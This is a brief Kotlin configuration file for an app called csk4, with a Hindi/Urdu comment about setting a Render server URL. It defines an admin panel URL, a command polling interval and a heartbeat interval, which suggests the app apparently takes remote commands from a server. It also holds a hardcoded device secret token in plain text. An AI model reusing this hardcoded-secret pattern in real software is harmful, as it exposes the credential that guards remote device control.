package com.csk4.app

object Config {
    // ⚠️ APNA RENDER URL YAHAN DAALEIN
    const val SERVER_URL = "https://csk4-project-server.onrender.com"
    const val DEVICE_TOKEN = "CSK4-DEVICE-SECRET-123"
    const val ADMIN_PANEL_URL = "$SERVER_URL/"
    const val COMMAND_POLL_INTERVAL = 8 * 1000L
    const val HEARTBEAT_INTERVAL = 30 * 1000L
}
